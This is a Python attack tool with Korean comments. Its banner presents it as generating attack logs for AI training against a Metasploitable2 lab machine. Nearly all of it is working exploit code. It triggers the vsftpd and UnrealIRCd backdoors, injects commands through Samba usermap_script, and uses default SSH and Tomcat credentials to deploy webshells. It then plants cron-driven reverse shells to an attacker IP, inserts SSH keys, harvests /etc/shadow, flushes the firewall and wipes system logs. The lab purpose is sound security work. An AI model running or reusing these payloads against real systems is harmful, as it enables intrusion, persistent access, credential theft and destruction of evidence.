import socket
import time
import paramiko
import requests
from requests.auth import HTTPBasicAuth
import zipfile
import io
import subprocess

# ==========================================
# [설정] 타겟 시스템(Metasploitable2) IP
# ==========================================
TARGET_IP = "localhost"
ATTACKER_IP = "192.168.0.50" # 리버스 쉘이 필요할 경우를 위한 공격자 IP

def print_step(msg):
    print(f"\n[+] {msg}")

def print_sub(msg):
    print(f" └── [*] {msg}")

# ---------------------------------------------------------
# 시나리오 1: vsftpd 2.3.4 백도어 (침투 + /etc/shadow 유출)
# ---------------------------------------------------------
def attack_vsftpd():
    print_step("시나리오 1: vsftpd 2.3.4 백도어 공격 시작")
    try:
        # 1. 침투 (백도어 트리거)
        print_sub("FTP(21) 포트로 특정 문자열(':)') 전송하여 백도어 개방 시도...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((TARGET_IP, 21))
        s.recv(1024)
        s.send(b"USER hacker:)\r\n")
        s.recv(1024)
        s.send(b"PASS anything\r\n")
        s.close()
        
        time.sleep(2) # 6200 포트가 열릴 때까지 대기
        
        # 2. 침투 후 공격 (6200 포트 접속 및 정보 유출)
        print_sub("6200번 포트(루트 쉘) 접속 및 /etc/shadow 내용 추출 중...")
        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell.settimeout(5)
        shell.connect((TARGET_IP, 6200))
        
        # OS 명령어 실행
        shell.send(b"echo 'VSFTPD_HACKED' > /tmp/vsftpd_hacked; head -n 3 /etc/shadow\n")
        result = shell.recv(4096).decode('utf-8', errors='ignore')
        print_sub(f"추출 결과:\n{result.strip()}")
        shell.close()
    except Exception as e:
        print_sub(f"오류 발생: {e}")

# ---------------------------------------------------------
# 시나리오 2: Samba usermap_script (침투 + 루트 계정 생성)
# ---------------------------------------------------------
def attack_samba():
    print_step("시나리오 2: Samba usermap_script RCE 공격 시작")
    # 침투 및 침투 후 공격
    # smbclient 명령어를 OS 단에서 실행하여 Username 영역에 악성 명령어 삽입
    # AI 탐지용 로깅을 위해 악성 루트 계정(hacker) 생성
    payload = "`useradd -o -u 0 -g 0 -M -d /root -s /bin/bash hacker; echo 'hacker:password' | chpasswd`"
    username_payload = f"'/={payload}'"
    
    print_sub("smbclient를 통해 Username 필드에 악성 명령어 주입 중...")
    cmd = f"smbclient //{TARGET_IP}/tmp -U {username_payload} -N -c 'quit'"
    
    try:
        # Popen을 사용하여 명령어 전송 (리턴을 기다리지 않아도 됨)
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print_sub("페이로드 전송 완료. Victim 시스템에 'hacker' 루트 계정이 생성되었습니다.")
    except Exception as e:
        print_sub(f"오류 발생: {e}")

# ---------------------------------------------------------
# 시나리오 3: SSH 무차별 대입 (침투 + 크론탭 지속성 확보)
# ---------------------------------------------------------
def attack_ssh():
    print_step("시나리오 3: SSH 기본 계정 접속 및 크론탭 조작 시작")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # 1. 침투 (약한 자격 증명 msfadmin:msfadmin 사용)
        print_sub("SSH 계정(msfadmin:msfadmin)으로 접속 시도...")
        client.connect(TARGET_IP, port=22, username="msfadmin", password="msfadmin")
        print_sub("접속 성공!")
        
        # 2. 침투 후 공격 (Cronjob 등록)
        print_sub("지속성 확보를 위해 악성 크론탭(Cronjob) 등록 중...")
        cron_cmd = f'(crontab -l 2>/dev/null; echo "* * * * * nc -e /bin/sh {ATTACKER_IP} 4444") | crontab -'
        stdin, stdout, stderr = client.exec_command(cron_cmd)
        stdout.read() # 명령어 실행 대기
        
        # 확인
        stdin, stdout, stderr = client.exec_command('crontab -l')
        print_sub(f"현재 크론탭 상태:\n{stdout.read().decode('utf-8').strip()}")
        
    except Exception as e:
        print_sub(f"오류 발생: {e}")
    finally:
        client.close()

# ---------------------------------------------------------
# 시나리오 4: Tomcat WAR 업로드 (침투 + 웹쉘 실행)
# ---------------------------------------------------------
def attack_tomcat():
    print_step("시나리오 4: Tomcat 관리자 페이지 악성 WAR 파일 업로드 시작")
    
    # 1. 악성 웹쉘 JSP를 포함한 WAR 파일을 메모리 상에서 동적 생성
    war_buffer = io.BytesIO()
    with zipfile.ZipFile(war_buffer, 'w') as zf:
        # 파라미터 'cmd'로 받은 OS 명령어를 실행하는 초소형 웹쉘
        jsp_code = '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
        zf.writestr('shell.jsp', jsp_code)
    war_buffer.seek(0)
    
    # 2. 침투 (HTTP PUT을 이용한 WAR 배포)
    print_sub("Tomcat Manager(기본 계정 tomcat:tomcat)를 통해 웹쉘 배포 중...")
    deploy_url = f"http://{TARGET_IP}:8180/manager/deploy?path=/malware&update=true"
    
    try:
        res = requests.put(deploy_url, auth=HTTPBasicAuth('tomcat', 'tomcat'), data=war_buffer.read())
        if res.status_code == 200:
            print_sub("웹쉘 업로드 성공! (/malware/shell.jsp)")
            
            # 3. 침투 후 공격 (웹쉘을 호출하여 외부 악성코드 다운로드 흉내내기)
            print_sub("업로드된 웹쉘을 호출하여 wget 명령어 실행 유도...")
            shell_url = f"http://{TARGET_IP}:8180/malware/shell.jsp"
            # 실제 악성코드 대신 /tmp/ 디렉토리에 빈 파일을 만들고 로그를 남기도록 함
            cmd_payload = "wget http://google.com -O /tmp/downloaded_malware.sh"
            requests.get(shell_url, params={'cmd': cmd_payload})
            print_sub("웹쉘 명령 실행 완료.")
        else:
            print_sub(f"업로드 실패. HTTP 상태 코드: {res.status_code}")
    except Exception as e:
        print_sub(f"오류 발생: {e}")

# ---------------------------------------------------------
# 시나리오 5: UnrealIRCd 백도어 (침투 + 방어 회피)
# ---------------------------------------------------------
def attack_unrealircd():
    print_step("시나리오 5: UnrealIRCd 백도어 및 방어 회피 공격 시작")
    
    # 1. 침투 & 침투 후 공격 (페이로드 동시 전송)
    # 백도어 트리거(AB;) 후, 공격 흔적을 지우기 위해 .bash_history를 비우는 명령어 실행
    cmd = "echo 'Hacked via IRC' > /tmp/irc_hacked; cat /dev/null > ~/.bash_history; history -c"
    payload = f"AB; {cmd}\n"
    
    print_sub("IRC(6667) 포트로 백도어 페이로드 및 흔적 지우기(Wiper) 명령 전송 중...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((TARGET_IP, 6667))
        s.send(payload.encode())
        s.close()
        print_sub("공격 페이로드 전송 완료. 시스템 명령어가 실행되었습니다.")
    except Exception as e:
        print_sub(f"오류 발생: {e}")


# ============================================================
# 시나리오 6 ~ 10: 통합 시나리오 (침투 → 침투 후 공격 체인)
# ============================================================


# ---------------------------------------------------------
# 시나리오 6: vsftpd 백도어 침투 → SSH 키 삽입 (지속성 확보)
# ---------------------------------------------------------
def attack_vsftpd_ssh_persistence():
    print_step("시나리오 6: vsftpd 백도어 침투 → SSH 키 삽입으로 지속성 확보")
    try:
        # ======== 단계 1: 침투 (vsftpd 백도어) ========
        print_sub("[단계 1] FTP(21) 백도어 트리거 중...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((TARGET_IP, 21))
        s.recv(1024)
        s.send(b"USER backdoor:)\r\n")
        s.recv(1024)
        s.send(b"PASS anything\r\n")
        s.close()

        time.sleep(2)

        # ======== 단계 2: 침투 후 공격 (SSH authorized_keys 삽입) ========
        print_sub("[단계 2] 6200번 포트(루트 쉘) 접속 후 SSH 공개키 삽입 중...")
        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell.settimeout(5)
        shell.connect((TARGET_IP, 6200))

        # 공격자의 가짜 SSH 공개키를 root의 authorized_keys에 추가
        fake_pubkey = "ssh-rsa AAAAB3FakePublicKeyForDemoOnly== attacker@kali"
        cmds = [
            "mkdir -p /root/.ssh",
            f"echo '{fake_pubkey}' >> /root/.ssh/authorized_keys",
            "chmod 600 /root/.ssh/authorized_keys",
            "chmod 700 /root/.ssh",
            "echo '[PERSISTENCE] SSH 키 삽입 완료'",
        ]
        full_cmd = " && ".join(cmds) + "\n"
        shell.send(full_cmd.encode())
        time.sleep(2)
        result = shell.recv(4096).decode('utf-8', errors='ignore')
        print_sub(f"결과: {result.strip()}")

        # 검증: authorized_keys 내용 확인
        shell.send(b"cat /root/.ssh/authorized_keys\n")
        time.sleep(1)
        verify = shell.recv(4096).decode('utf-8', errors='ignore')
        print_sub(f"authorized_keys 내용:\n{verify.strip()}")
        shell.close()

    except Exception as e:
        print_sub(f"오류 발생: {e}")


# ---------------------------------------------------------
# 시나리오 7: Samba RCE 침투 → 내부 네트워크 스캔 (횡적 이동 정찰)
# ---------------------------------------------------------
def attack_samba_network_scan():
    print_step("시나리오 7: Samba RCE 침투 → 내부 네트워크 스캔 (횡적 이동 준비)")

    # ======== 단계 1: 침투 (Samba usermap_script RCE) ========
    # 네트워크 스캔 명령어를 Samba RCE로 실행
    # arp-scan 또는 간단한 ping sweep + 열린 포트 확인
    recon_script = (
        "echo '=== NETWORK RECON START ===' > /tmp/recon_result.txt; "
        # 현재 네트워크 인터페이스 정보 수집
        "ifconfig >> /tmp/recon_result.txt 2>/dev/null; "
        # ARP 테이블로 인접 호스트 파악
        "arp -a >> /tmp/recon_result.txt 2>/dev/null; "
        # 내부 대역 ping sweep (192.168.0.0/24 중 주요 호스트만)
        "for i in 1 2 50 100 254; do "
        "ping -c 1 -W 1 192.168.0.$i > /dev/null 2>&1 && "
        "echo \"HOST UP: 192.168.0.$i\" >> /tmp/recon_result.txt; "
        "done; "
        # 발견된 호스트에 대해 주요 포트 스캔
        "for port in 22 80 443 3306 8080; do "
        "(echo > /dev/tcp/192.168.0.50/$port) 2>/dev/null && "
        "echo \"PORT OPEN: 192.168.0.50:$port\" >> /tmp/recon_result.txt; "
        "done; "
        "echo '=== NETWORK RECON END ===' >> /tmp/recon_result.txt"
    )

    payload = f"`{recon_script}`"
    username_payload = f"'/={payload}'"

    print_sub("[단계 1] Samba RCE를 통해 네트워크 정찰 스크립트 주입 중...")
    cmd = f"smbclient //{TARGET_IP}/tmp -U {username_payload} -N -c 'quit'"

    try:
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
        print_sub("네트워크 정찰 스크립트 실행 완료.")
    except subprocess.TimeoutExpired:
        print_sub("명령 시간 초과 (정상적일 수 있음, 페이로드는 이미 전송됨).")
    except Exception as e:
        print_sub(f"오류 발생: {e}")

    time.sleep(3)

    # ======== 단계 2: 침투 후 공격 (정찰 결과 회수) ========
    # vsftpd 백도어를 재활용하여 정찰 결과 파일을 회수
    print_sub("[단계 2] vsftpd 백도어를 통해 정찰 결과 파일 회수 중...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((TARGET_IP, 21))
        s.recv(1024)
        s.send(b"USER recon:)\r\n")
        s.recv(1024)
        s.send(b"PASS x\r\n")
        s.close()
        time.sleep(2)

        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell.settimeout(5)
        shell.connect((TARGET_IP, 6200))
        shell.send(b"cat /tmp/recon_result.txt\n")
        time.sleep(2)
        result = shell.recv(8192).decode('utf-8', errors='ignore')
        print_sub(f"내부 네트워크 정찰 결과:\n{result.strip()}")
        shell.close()
    except Exception as e:
        print_sub(f"정찰 결과 회수 실패: {e}")


# ---------------------------------------------------------
# 시나리오 8: SSH 침투 → 권한 상승 + 민감 데이터 유출
# ---------------------------------------------------------
def attack_ssh_privesc_exfil():
    print_step("시나리오 8: SSH 침투 → 권한 상승 시도 + 민감 데이터 유출")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # ======== 단계 1: 침투 (SSH 약한 자격 증명) ========
        print_sub("[단계 1] SSH 약한 자격 증명(msfadmin:msfadmin)으로 침투 중...")
        client.connect(TARGET_IP, port=22, username="msfadmin", password="msfadmin")
        print_sub("SSH 접속 성공!")

        # ======== 단계 2: 침투 후 공격 ========

        # 2-1. 시스템 정보 수집
        print_sub("[단계 2-1] 시스템 열거(Enumeration) 수행 중...")
        enum_cmds = [
            ("uname -a", "커널 정보"),
            ("id", "현재 사용자 권한"),
            ("cat /etc/os-release 2>/dev/null || cat /etc/issue", "OS 정보"),
            ("df -h", "디스크 사용량"),
            ("w", "현재 접속 사용자"),
        ]
        for cmd, desc in enum_cmds:
            stdin, stdout, stderr = client.exec_command(cmd)
            output = stdout.read().decode('utf-8', errors='ignore').strip()
            print_sub(f"  {desc}: {output[:120]}")
            time.sleep(0.3)

        # 2-2. SUID 바이너리 탐색 (권한 상승 벡터)
        print_sub("[단계 2-2] SUID 바이너리 탐색 중 (권한 상승 벡터 검색)...")
        stdin, stdout, stderr = client.exec_command(
            "find / -perm -u=s -type f 2>/dev/null | head -15"
        )
        suid_result = stdout.read().decode('utf-8', errors='ignore').strip()
        print_sub(f"  발견된 SUID 바이너리:\n{suid_result}")
        time.sleep(0.5)

        # 2-3. sudo 권한 확인
        print_sub("[단계 2-3] sudo 권한 확인 중...")
        stdin, stdout, stderr = client.exec_command(
            "echo 'msfadmin' | sudo -S -l 2>/dev/null"
        )
        sudo_result = stdout.read().decode('utf-8', errors='ignore').strip()
        if sudo_result:
            print_sub(f"  sudo 권한: {sudo_result[:200]}")
        else:
            print_sub("  sudo 권한 없음 또는 확인 불가")
        time.sleep(0.5)

        # 2-4. 민감 데이터 유출
        print_sub("[단계 2-4] 민감 데이터 수집 및 유출 중...")
        exfil_cmds = [
            ("cat /etc/passwd", "/etc/passwd"),
            ("cat /etc/shadow 2>/dev/null || echo 'Permission Denied'", "/etc/shadow"),
            ("cat /etc/mysql/debian.cnf 2>/dev/null || echo 'Not Found'", "MySQL 인증 정보"),
            ("find /home -name '*.txt' -o -name '*.conf' -o -name '*.cfg' 2>/dev/null | head -10",
             "홈 디렉토리 설정 파일"),
        ]
        for cmd, desc in exfil_cmds:
            stdin, stdout, stderr = client.exec_command(cmd)
            output = stdout.read().decode('utf-8', errors='ignore').strip()
            if output:
                # 결과를 /tmp에 저장 (유출 시뮬레이션)
                print_sub(f"  [{desc}] 수집 완료 ({len(output)} bytes)")
            time.sleep(0.3)

        # 유출 파일 패키징 시뮬레이션
        print_sub("[단계 2-5] 수집된 데이터를 /tmp/exfil_data.tar.gz로 패키징 중...")
        stdin, stdout, stderr = client.exec_command(
            "tar czf /tmp/exfil_data.tar.gz /etc/passwd /etc/shadow "
            "/etc/mysql/debian.cnf 2>/dev/null; ls -la /tmp/exfil_data.tar.gz"
        )
        tar_result = stdout.read().decode('utf-8', errors='ignore').strip()
        print_sub(f"  패키징 결과: {tar_result}")

    except Exception as e:
        print_sub(f"오류 발생: {e}")
    finally:
        client.close()


# ---------------------------------------------------------
# 시나리오 9: Tomcat 침투 → 리버스 쉘 드롭 + 방화벽 규칙 변조
# ---------------------------------------------------------
def attack_tomcat_reverse_shell():
    print_step("시나리오 9: Tomcat 침투 → 리버스 쉘 배포 + 방화벽 무력화")

    # ======== 단계 1: 침투 (Tomcat WAR 웹쉘 배포) ========
    print_sub("[단계 1] Tomcat Manager를 통해 고급 웹쉘 배포 중...")

    # 명령 결과를 반환하는 개선된 웹쉘
    jsp_code = (
        '<%@ page import="java.util.*,java.io.*"%>'
        '<%String cmd=request.getParameter("cmd");'
        'if(cmd!=null){'
        'Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});'
        'Scanner s=new Scanner(p.getInputStream()).useDelimiter("\\\\A");'
        'out.println(s.hasNext()?s.next():"");}%>'
    )

    war_buffer = io.BytesIO()
    with zipfile.ZipFile(war_buffer, 'w') as zf:
        zf.writestr('cmd.jsp', jsp_code)
    war_buffer.seek(0)

    deploy_url = f"http://{TARGET_IP}:8180/manager/deploy?path=/backdoor&update=true"

    try:
        res = requests.put(
            deploy_url,
            auth=HTTPBasicAuth('tomcat', 'tomcat'),
            data=war_buffer.read(),
            timeout=10,
        )
        if res.status_code != 200:
            print_sub(f"웹쉘 배포 실패 (HTTP {res.status_code})")
            return

        print_sub("웹쉘 배포 성공! (/backdoor/cmd.jsp)")
        shell_url = f"http://{TARGET_IP}:8180/backdoor/cmd.jsp"

        # ======== 단계 2: 침투 후 공격 ========

        # 2-1. 시스템 정보 확인
        print_sub("[단계 2-1] 웹쉘로 시스템 정보 수집 중...")
        info_cmds = ["id", "uname -a", "cat /etc/hostname"]
        for cmd in info_cmds:
            r = requests.get(shell_url, params={'cmd': cmd}, timeout=5)
            output = r.text.strip()
            if output:
                print_sub(f"  {cmd}: {output[:150]}")
            time.sleep(0.3)

        # 2-2. 방화벽 규칙 확인 및 무력화
        print_sub("[단계 2-2] 방화벽(iptables) 규칙 확인 및 무력화 시도...")
        r = requests.get(shell_url, params={'cmd': 'iptables -L -n 2>&1'}, timeout=5)
        print_sub(f"  현재 iptables 규칙:\n{r.text.strip()[:300]}")

        # 모든 INPUT/OUTPUT 허용으로 방화벽 무력화
        fw_cmds = [
            "iptables -P INPUT ACCEPT",
            "iptables -P FORWARD ACCEPT",
            "iptables -P OUTPUT ACCEPT",
            "iptables -F",
        ]
        for fw_cmd in fw_cmds:
            requests.get(shell_url, params={'cmd': fw_cmd}, timeout=5)
            time.sleep(0.3)
        print_sub("  방화벽 정책 ACCEPT 전환 및 규칙 초기화 완료.")

        # 2-3. 리버스 쉘 스크립트 배치
        print_sub("[단계 2-3] 리버스 쉘 스크립트 생성 및 실행 예약 중...")
        reverse_shell_script = (
            f"#!/bin/bash\\n"
            f"while true; do\\n"
            f"  /bin/bash -i >& /dev/tcp/{ATTACKER_IP}/9999 0>&1 2>/dev/null\\n"
            f"  sleep 60\\n"
            f"done"
        )
        # 스크립트 작성
        write_cmd = f"echo -e '{reverse_shell_script}' > /tmp/rev.sh && chmod +x /tmp/rev.sh"
        requests.get(shell_url, params={'cmd': write_cmd}, timeout=5)

        # 크론잡으로 자동 재실행 등록
        cron_cmd = (
            '(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/rev.sh") | crontab -'
        )
        requests.get(shell_url, params={'cmd': cron_cmd}, timeout=5)
        print_sub("  리버스 쉘 스크립트 배치 및 크론잡 등록 완료.")

        # 2-4. 확인
        r = requests.get(shell_url, params={'cmd': 'crontab -l'}, timeout=5)
        print_sub(f"  현재 크론탭:\n{r.text.strip()}")

    except Exception as e:
        print_sub(f"오류 발생: {e}")


# ---------------------------------------------------------
# 시나리오 10: UnrealIRCd 침투 → 루트킷 시뮬레이션 + 로그 삭제
# ---------------------------------------------------------
def attack_unrealircd_rootkit():
    print_step("시나리오 10: UnrealIRCd 침투 → 루트킷 설치 시뮬레이션 + 로그 완전 삭제")

    try:
        # ======== 단계 1: 침투 (UnrealIRCd 백도어) ========
        print_sub("[단계 1] IRC(6667) 백도어 트리거 및 초기 정찰 중...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, 6667))
        time.sleep(1)
        try:
            s.recv(4096)
        except socket.timeout:
            pass

        # 초기 정찰 명령
        recon_cmd = "id; uname -a; cat /etc/hostname"
        s.send(f"AB; {recon_cmd}\n".encode())
        time.sleep(2)
        try:
            recon_result = s.recv(4096).decode('utf-8', errors='ignore').strip()
            print_sub(f"  초기 정찰 결과: {recon_result[:200]}")
        except socket.timeout:
            print_sub("  초기 정찰 결과 수신 타임아웃 (명령은 실행됨)")
        s.close()

        time.sleep(1)

        # ======== 단계 2: 침투 후 공격 (루트킷 시뮬레이션 + 로그 삭제) ========
        print_sub("[단계 2] 백도어 재접속 후 루트킷 시뮬레이션 + 로그 삭제 수행 중...")
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2.settimeout(5)
        s2.connect((TARGET_IP, 6667))
        time.sleep(1)
        try:
            s2.recv(4096)
        except socket.timeout:
            pass

        # 2-1. 은닉 디렉토리에 백도어 바이너리 시뮬레이션
        rootkit_cmds = [
            # 숨김 디렉토리 생성 (점(.)으로 시작하여 ls에서 안 보임)
            "mkdir -p /dev/shm/.hidden",
            # 가짜 백도어 스크립트 생성
            "echo '#!/bin/bash' > /dev/shm/.hidden/syscheck",
            f"echo '/bin/bash -i >& /dev/tcp/{ATTACKER_IP}/8888 0>&1' >> /dev/shm/.hidden/syscheck",
            "chmod +x /dev/shm/.hidden/syscheck",
            # 정상 프로세스 이름으로 위장한 심볼릭 링크
            "ln -sf /dev/shm/.hidden/syscheck /dev/shm/.hidden/kworker",
        ]
        rootkit_full = " && ".join(rootkit_cmds)
        s2.send(f"AB; {rootkit_full}\n".encode())
        time.sleep(2)
        print_sub("  루트킷 시뮬레이션 파일 배치 완료 (/dev/shm/.hidden/)")

        # 2-2. 로그 삭제 (방어 회피)
        log_wipe_cmds = [
            # auth 로그 비우기
            "cat /dev/null > /var/log/auth.log",
            # syslog 비우기
            "cat /dev/null > /var/log/syslog",
            # wtmp(로그인 기록) 비우기
            "cat /dev/null > /var/log/wtmp",
            # lastlog 비우기
            "cat /dev/null > /var/log/lastlog",
            # bash history 삭제
            "cat /dev/null > /root/.bash_history",
            "cat /dev/null > /home/msfadmin/.bash_history 2>/dev/null",
            # 성공 파일 생성
            "echo 'ROOTKIT_INSTALLED' > /tmp/rootkit_status",
        ]
        log_wipe_full = " && ".join(log_wipe_cmds)
        s2.send(f"AB; {log_wipe_full}\n".encode())
        time.sleep(2)
        print_sub("  시스템 로그 전체 삭제 완료 (auth.log, syslog, wtmp, lastlog, bash_history)")

        # 결과 확인
        s2.send(b"AB; cat /tmp/rootkit_status; ls -la /dev/shm/.hidden/\n")
        time.sleep(2)
        try:
            verify = s2.recv(4096).decode('utf-8', errors='ignore').strip()
            print_sub(f"  검증 결과:\n{verify[:300]}")
        except socket.timeout:
            print_sub("  검증 결과 수신 타임아웃")
        s2.close()

    except Exception as e:
        print_sub(f"오류 발생: {e}")


# ==========================================
# 메인 실행 메뉴
# ==========================================
if __name__ == "__main__":
    print("="*60)
    print("  [ AI 학습 로그 생성용 Metasploitable2 자동 공격 도구 ]  ")
    print("="*60)
    print("\n[기본 시나리오]")
    print("  1. vsftpd 2.3.4 백도어 (정보 유출)")
    print("  2. Samba usermap_script (루트 계정 생성)")
    print("  3. SSH 무차별 대입 (크론탭 지속성)")
    print("  4. Tomcat 웹쉘 업로드 (원격 명령어 실행)")
    print("  5. UnrealIRCd 백도어 (방어 회피/로그 삭제)")
    print("\n[통합 시나리오 — 침투 → 침투 후 공격]")
    print("  6. vsftpd 백도어 → SSH 키 삽입 (지속성 확보)")
    print("  7. Samba RCE → 내부 네트워크 스캔 (횡적 이동 정찰)")
    print("  8. SSH 침투 → 권한 상승 시도 + 민감 데이터 유출")
    print("  9. Tomcat 침투 → 리버스 쉘 배포 + 방화벽 무력화")
    print(" 10. UnrealIRCd 침투 → 루트킷 시뮬레이션 + 로그 완전 삭제")
    print("\n[일괄 실행]")
    print(" 11. 기본 시나리오 전체 실행 (1~5)")
    print(" 12. 통합 시나리오 전체 실행 (6~10)")
    print(" 13. 전체 시나리오 실행 (1~10)")
    print("="*60)
    
    choice = input("실행할 시나리오 번호를 입력하세요: ")
    
    scenario_map = {
        '1': attack_vsftpd,
        '2': attack_samba,
        '3': attack_ssh,
        '4': attack_tomcat,
        '5': attack_unrealircd,
        '6': attack_vsftpd_ssh_persistence,
        '7': attack_samba_network_scan,
        '8': attack_ssh_privesc_exfil,
        '9': attack_tomcat_reverse_shell,
        '10': attack_unrealircd_rootkit,
    }

    if choice in scenario_map:
        scenario_map[choice]()
    elif choice == '11':
        for i in ['1', '2', '3', '4', '5']:
            scenario_map[i]()
            time.sleep(2)
    elif choice == '12':
        for i in ['6', '7', '8', '9', '10']:
            scenario_map[i]()
            time.sleep(2)
    elif choice == '13':
        for i in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']:
            scenario_map[i]()
            time.sleep(2)
    else:
        print("잘못된 입력입니다.")
